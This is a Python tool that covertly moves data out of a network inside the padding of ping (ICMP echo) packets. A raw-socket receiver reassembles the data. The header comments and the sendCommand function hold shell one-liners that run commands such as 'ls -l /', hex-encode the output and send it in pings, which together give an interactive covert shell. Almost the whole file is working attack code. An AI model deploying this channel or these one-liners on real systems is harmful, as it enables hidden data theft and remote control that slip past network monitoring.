#!/usr/bin/env python3

import threading
import socket
import sys
import signal
import argparse

# cont="AAAAAAAAAAAAAAAA""$(ls -l /)""AAAAAAAAAAAAAAAA"; echo -n "$cont" | hexdump -v -e '16/1 "%02x" "\n"' | while read line; do ping -c 1 -p $line 127.0.0.1; done
# cont="AAAAAAAAAAAAAAAA""$(ls -l /)""AAAAAAAAAAAAAAAA"; echo -n "$cont" | xxd -c 16 -ps | while read line; do ping -c 1 -p $line 127.0.0.1; done

description = \
    'Read data sent as padding from unix ping tool through the -p option. '\
    'Can be used as just a data receiver or as a primitive shell after implementing the sendCommand function'
parser = argparse.ArgumentParser(description=description)
parser.add_argument('targetIP', type = str,
        help = 'Target IP address')
parser.add_argument('encapChr', type = str,
        help = 'Character to use for encapsulating data. Must be the same character used on the other end')
parser.add_argument('-o', '--outfile', metavar = 'outputFile', type = str,
        help = 'Set this if you want to save all the output to a file')
parser.add_argument('-i', '--interactive', action = 'store_true', 
        help = 'Interactive shell mode')


fds = []


def eprint(s):
    print(s, file=sys.stderr)


def ctrlc(sig, frame):
    global fds
    if args.interactive:
        eprint('\npress <return> to exit')
    for fd in fds:
        fd.close()
    exit(0)


def recvData(encap, targetIP, outfile = None):
    global fds
    payloadBuf = b''
    parsingFlag = False
    payloadOff = 0
    encap = str.encode(encap)
    encapStr = encap * 16
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except PermissionError:
        eprint('Can\'t open socket. Root permissions required')
        exit(1)
    fds.append(s)

    while True:
        tcpPkt, src = s.recvfrom(65536)
        srcIP = src[0]
        icmpPktOff = (tcpPkt[0] & 0x0f) << 2 # start offset of tcp payload
        icmpPkt = tcpPkt[icmpPktOff:]
        icmpData = icmpPkt[8:] # 8 bytes icmp header

        if srcIP != targetIP or icmpPkt[0] != 8:
            # only handle icmp echo requests coming from the target ip
            continue
        if encapStr in icmpData and not parsingFlag:
            parsingFlag = True
            payloadOff = icmpData.find(encapStr)
            continue
        if not parsingFlag:
            continue

        payload = icmpData[payloadOff:payloadOff + 16]
        payloadBuf += payload
        if payloadBuf[-16:] == encapStr:
            parsingFlag = False
            payloadBuf = payloadBuf.strip(encap)
            if outfile:
                outfile.write(payloadBuf)
            try:
                payloadBuf = payloadBuf.decode('utf-8')
            except UnicodeDecodeError:
                pass
            finally:
                print(payloadBuf)
                payloadBuf = b''


class ShellThread(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)

    def run(self):
        eprint('exit with <CtrlC><Ret>')
        inpt = sys.stdin.buffer.readline()
        while inpt:
            self.sendCommand(inpt)
            inpt = sys.stdin.buffer.readline()

    def sendCommand(self, cmdStr):
        # here goes the stuff to send commands
        # the following is just an example that works on 127.0.0.1
        import subprocess as sp
        cmdStr = '''cont="{encap}""$({cmd})""{encap}"; '''\
                '''echo -n "$cont" | hexdump -v -e '16/1 "%02x" "\\n"' '''\
                '''| while read line; do ping -c 1 -p $line {ip}; done'''\
                .format(cmd = cmdStr.decode().strip(), \
                    encap = str(args.encapChr * 16 ), \
                    ip = args.targetIP)
        sp.Popen(cmdStr, shell = True, stdout = sp.DEVNULL) 


if __name__ == '__main__':
    args = parser.parse_args()

    if len(args.encapChr) > 1:
        eprint('encapChr must be a single character!')
        exit(1)

    if args.interactive:
        shellThread = ShellThread()
        shellThread.daemon = True
        shellThread.start()

    if args.outfile:
        ofd = open(args.outfile, 'wb')
        fds.append(ofd)

    signal.signal(signal.SIGINT, ctrlc)
    recvData(args.encapChr, args.targetIP, outfile = args.outfile)


